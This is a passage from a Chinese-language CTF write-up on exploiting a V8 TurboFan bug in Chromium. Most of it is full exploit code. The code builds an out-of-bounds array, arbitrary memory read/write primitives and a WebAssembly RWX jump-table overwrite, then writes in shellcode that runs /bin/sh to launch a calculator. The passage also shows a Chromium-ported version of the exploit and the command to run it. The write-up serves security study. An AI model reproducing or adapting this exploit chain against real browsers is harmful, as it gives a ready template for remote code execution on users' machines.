-- *******/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array_buffer;</span><br><span class="line">array_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x233</span>);</span><br><span class="line">data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(array_buffer);</span><br><span class="line">backing_store_offset = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定backing_store_offset</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// smi(0x400) == 0x0000023300000000</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x0000023300000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        backing_store_offset = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 backing_store</span></span><br><span class="line"><span class="keyword">if</span>(backing_store_offset == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"backing_store is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] find backing_store offset: "</span> + backing_store_offset);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_8bytes</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    <span class="keyword">return</span> data_view.getBigInt64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_8bytes</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    data_view.setBigInt64(<span class="number">0</span>, BigInt(data), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 布置 wasm 地址以及获取 RWX 内存地址 -- *******/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prettyHex</span>(<span class="params">bigint</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0x"</span> + BigInt.asUintN(<span class="number">64</span>,bigint).toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br><span class="line"><span class="comment">// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上</span></span><br><span class="line"><span class="comment">// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址</span></span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionObj = &#123;<span class="attr">guard</span>: Int64ToFloat64(<span class="number">0x233333</span>), <span class="attr">wasmAddr</span>: WasmJSFunction&#125;;</span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionIndex = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// 查找哨兵值</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x233333</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WasmJSFunctionIndex = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 WasmJSFunctionAddr</span></span><br><span class="line"><span class="keyword">if</span>(WasmJSFunctionIndex == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"WasmJSFunctionAddr is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] find WasmJSFunctionAddr offset: "</span> + WasmJSFunctionIndex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 WasmJSFunction 地址</span></span><br><span class="line">WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmJSFunction address: "</span> + prettyHex(WasmJSFunctionAddr));</span><br><span class="line"><span class="comment">// 获取 SharedFunctionInfo 地址</span></span><br><span class="line">SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(<span class="number">0x18</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find SharedFunctionInfoAddr address: "</span> + prettyHex(SharedFunctionInfoAddr));</span><br><span class="line"><span class="comment">// 获取 WasmExportedFunctionData 地址</span></span><br><span class="line">WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(<span class="number">0x8</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmExportedFunctionDataAddr address: "</span> + prettyHex(WasmExportedFunctionDataAddr));</span><br><span class="line"><span class="comment">// 获取 WasmInstanceObject 地址</span></span><br><span class="line">WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(<span class="number">0x10</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmInstanceObjectAddr address: "</span> + prettyHex(WasmInstanceObjectAddr));</span><br><span class="line"><span class="comment">// 获取 JumpTableStart 地址</span></span><br><span class="line">JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(<span class="number">0xe8</span>));</span><br><span class="line">log(<span class="string">"[+] find JumpTableStartAddr address: "</span> + prettyHex(JumpTableStartAddr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 写入并执行shell code -- *******/</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(</span><br><span class="line">    [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>,</span><br><span class="line">     <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x00</span>,</span><br><span class="line">     <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>,</span><br><span class="line">     <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x75</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x00</span>,</span><br><span class="line">     <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 写入shellcode </span></span><br><span class="line">log(<span class="string">"[+] writing shellcode ... "</span>);</span><br><span class="line"><span class="comment">// (尽管单次写入内存的数据大小为8bytes，但为了简便，一次只写入 1bytes 有效数据)</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    write_8bytes(JumpTableStartAddr + BigInt(i), shellcode[i]);</span><br><span class="line"><span class="comment">// 执行shellcode</span></span><br><span class="line">log(<span class="string">"[+] execute calculator !"</span>);</span><br><span class="line">WasmJSFunction();</span><br></pre></td></tr></table></figure>
<p>最终在 release 版下的 v8 可以成功调用 calculator：</p>
<p><img src="/2021/01/v8-turboFan/debugprint14.png" alt="img"></p>
</li>
<li>
<p>但我们做题实际用到附件是一个带漏洞 v8 的 chromium。为了将 exploit 从 v8 移植到 chromium，其中<strong>做了一点点微调</strong>，因此最终的 exploit 如下：</p>
<blockquote>
<p>这里主要调整了两个地方：</p>
<ol>
<li><strong>微调了内存布局。</strong><br>
将oob_arr、array_buffer以及WasmJSFunctionObj放的更近，使得内存布局的相对偏移不会太大。这样搜索哨兵值时就不用搜索太多次。</li>
<li><strong>将两个搜索哨兵值的for循环合并成一个。</strong><br>
因为动态调试发现，当第二个for循环开始执行几十个循环后，原先存放 oob_array 以及 WasmJSFunctionObj 内存的数据将会被覆盖，<strong>疑似</strong>GC因为对象被过多访问而将其移动至另一个内存段上。这对我们泄露地址相当不利，因此合并两个for循环以降低搜索次数。</li>
</ol>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> transformBuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> bigIntArray = <span class="keyword">new</span> BigInt64Array(transformBuffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> floatArray = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(transformBuffer);</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">Int64ToFloat64</span><span class="params">(int)</span> </span>&#123;</span></span><br><span class="line">        bigIntArray[0] = BigInt(int);</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> floatArray[<span class="number">0</span>];</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">Float64ToInt64</span><span class="params">(float)</span> </span>&#123;</span></span><br><span class="line">        floatArray[0] = float;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> bigIntArray[<span class="number">0</span>];</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 修改JSArray length 的操作 -- *******/</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> oob_arr = [];</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">opt_me</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line">        oob_arr = [1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6];</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span></span><br><span class="line">        t = t + 1 + 1;</span><br><span class="line">        t -= 9007199254740990;</span><br><span class="line">        t *= 2;</span><br><span class="line">        t += 2;</span><br><span class="line"><span class="actionscript">        oob_arr[t] = <span class="number">3.4766779039175022e-310</span>; <span class="comment">// 0x4000.f2smi</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="comment">// 试着触发 turboFan，从而修改 JSArray 的 length</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span></span><br><span class="line">        opt_me(1);</span><br><span class="line"><span class="actionscript">    <span class="comment">// 简单 checker</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (oob_arr[<span class="number">1023</span>] == <span class="literal">undefined</span>)</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">throw</span> <span class="string">"OOB Fail!"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"[+] oob_arr.length == "</span> + oob_arr.length);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 布置内存（使 oob_array、array_buffer 以及 WasmJSFunctionObj 相邻） -- *******/</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 注意必须在执行完turboFan后开始布置</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> array_buffer;</span></span><br><span class="line"><span class="javascript">    array_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x233</span>);</span></span><br><span class="line"><span class="javascript">    data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(array_buffer);</span></span><br><span class="line">    backing_store_offset = -1;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span></span><br><span class="line">        0, 1, 96, 0, 0, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5,</span><br><span class="line">        131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2,</span><br><span class="line">        6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 102, 117, 110, 99, 0, 0, 10, 136, 128, 128, 128,</span><br><span class="line">        0, 1, 130, 128, 128, 128, 0, 0, 11]);</span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode), &#123;&#125;);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> WasmJSFunction = m.exports.func;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> WasmJSFunctionObj = &#123; guard: Int64ToFloat64(<span class="number">0x233333</span>), wasmAddr: WasmJSFunction &#125;;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> WasmJSFunctionIndex = <span class="number">-1</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 任意地址读写原语 -- *******/</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// 确定backing_store_offset 以及 WasmJSFunctionIndex</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 只用一个for循环，只遍历一次</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> val = Float64ToInt64(oob_arr[i]);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 开始查找哨兵值</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 在查找array_buffer的backing_store时，注意DataView在Array_buffer高地址处</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 查找哨兵值时有可能会查找到错误的位置，因此这里只取查找到的第一个地方</span></span></span><br><span class="line">        if (backing_store_offset == -1 &amp;&amp; val == 0x0000023300000000) &#123;</span><br><span class="line">            backing_store_offset = i + 1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"[+] find backing_store offset: "</span> + backing_store_offset);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">else</span> <span class="keyword">if</span> (WasmJSFunctionIndex == <span class="number">-1</span> &amp;&amp; val == <span class="number">0x233333</span>) &#123;</span></span><br><span class="line">            WasmJSFunctionIndex = i + 1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"[+] find WasmJSFunctionAddr offset: "</span> + WasmJSFunctionIndex);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">// 如果都找到了就不用再找，以免碰上SIGMAP</span></span></span><br><span class="line">        if (backing_store_offset != -1 &amp;&amp; WasmJSFunctionIndex != -1)</span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="comment">// 简单确认一下是否成功找到 backing_store</span></span></span><br><span class="line">    if (backing_store_offset == -1)</span><br><span class="line"><span class="actionscript">        <span class="keyword">throw</span> <span class="string">"backing_store is not found!"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 简单确认一下是否成功找到 WasmJSFunctionAddr</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span> <span class="keyword">if</span> (WasmJSFunctionIndex == <span class="number">-1</span>)</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">throw</span> <span class="string">"WasmJSFunctionAddr is not found!"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">read_8bytes</span><span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line">        oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> data_view.getBigInt64(<span class="number">0</span>, <span class="literal">true</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">write_8bytes</span><span class="params">(addr, data)</span> </span>&#123;</span></span><br><span class="line">        oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line"><span class="actionscript">        data_view.setBigInt64(<span class="number">0</span>, BigInt(data), <span class="literal">true</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 布置 wasm 地址以及获取 RWX 内存地址 -- *******/</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">prettyHex</span><span class="params">(bigint)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + BigInt.asUintN(<span class="number">64</span>, bigint).toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">'0'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 WasmJSFunction 地址</span></span></span><br><span class="line">    WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find WasmJSFunction address: "</span> + prettyHex(WasmJSFunctionAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 SharedFunctionInfo 地址</span></span></span><br><span class="line">    SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(0x18)) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find SharedFunctionInfoAddr address: "</span> + prettyHex(SharedFunctionInfoAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 WasmExportedFunctionData 地址</span></span></span><br><span class="line">    WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(0x8)) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find WasmExportedFunctionDataAddr address: "</span> + prettyHex(WasmExportedFunctionDataAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 WasmInstanceObject 地址</span></span></span><br><span class="line">    WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(0x10)) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find WasmInstanceObjectAddr address: "</span> + prettyHex(WasmInstanceObjectAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 JumpTableStart 地址</span></span></span><br><span class="line">    JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(0xe8));</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find JumpTableStartAddr address: "</span> + prettyHex(JumpTableStartAddr));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 写入并执行shell code -- *******/</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(</span></span><br><span class="line">        [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,</span><br><span class="line">            0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x1c, 0x00,</span><br><span class="line">            0x00, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x20, 0x67, 0x6e,</span><br><span class="line">            0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00,</span><br><span class="line">            0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05]</span><br><span class="line">    );</span><br><span class="line"><span class="actionscript">    <span class="comment">// 写入shellcode </span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] writing shellcode ... "</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// (尽管单次写入内存的数据大小为8bytes，但为了简便，一次只写入 1bytes 有效数据)</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span></span><br><span class="line">        write_8bytes(JumpTableStartAddr + BigInt(i), shellcode[i]);</span><br><span class="line"><span class="actionscript">    <span class="comment">// 执行shellcode</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] try to execute shellcode ... "</span>);</span></span><br><span class="line">    WasmJSFunction();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用如下命令以执行exp:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome/chrome --no-sandbox --user-data-dir=./userdata http:<span class="comment">//127.0.0.1:8000/test.html</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>尽管给出的附件打了no-sandbox的patch，但实际exp仍然无法执行，必须附加参数<code>--no-sandbox</code>才能成功触发，玄学问题XD。</p>
</blockquote>
<p>效果如下：</p>
<p>![img](v8-turboFan/exp.gif %}</p>
</li>
</ul>
<h2 id="七、参考">七、参考</h2>
<ol>
<li><a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/" target="_blank" rel="noopener">Introduction to TurboFan</a></li>
<li><a href="https://de4dcr0w.github.io/google-ctf-2018-browser-pwn%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">google-ctf-2018-browser-pwn分析</a></li>
